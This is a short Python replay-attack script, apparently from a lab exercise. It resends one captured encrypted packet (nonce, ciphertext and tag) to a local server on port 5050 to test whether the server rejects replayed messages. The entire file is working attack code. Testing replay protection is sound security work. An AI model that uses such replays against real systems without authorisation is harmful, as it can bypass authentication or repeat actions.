# replay_attack_data.py
import socket, base64, json, struct

# 1. Paste one encrypted packet captured from Wireshark here:
RAW_PACKET = {"type": "data", "seq": 4, "nonce": "upU8f9vHmEzduya+", "ciphertext": "gF3SHHqKJjEHW/KmYTjSFGSBiGYpOQ==", "tag": "wbKP2NYWj/JJJB5IK8yGiw=="}

def encode_packet(packet_dict):
    json_bytes = json.dumps(packet_dict).encode()
    length = struct.pack("!I", len(json_bytes))
    return length + json_bytes

def main():
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect(("127.0.0.1", 5050))
    print("[ATTACK] Connected. Sending replayed ciphertext...")
    
    payload = encode_packet(RAW_PACKET)
    sock.sendall(payload)
    print("[ATTACK] Packet sent. Closing.")
    sock.close()

if __name__ == "__main__":
    main()
